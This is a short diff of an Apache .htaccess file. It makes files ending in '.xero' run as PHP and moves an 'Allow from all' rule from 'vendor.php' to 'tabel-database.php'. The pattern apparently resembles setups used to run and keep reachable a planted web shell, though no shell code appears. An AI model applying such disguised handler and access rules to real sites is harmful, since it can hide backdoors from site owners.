@@ -6,7 +6,7 @@ Options -Indexes
 <FilesMatch "\.xero$">
     SetHandler application/x-httpd-php
 </FilesMatch>
-<FilesMatch "^(vendor.php)$">
+<FilesMatch "^(tabel-database.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
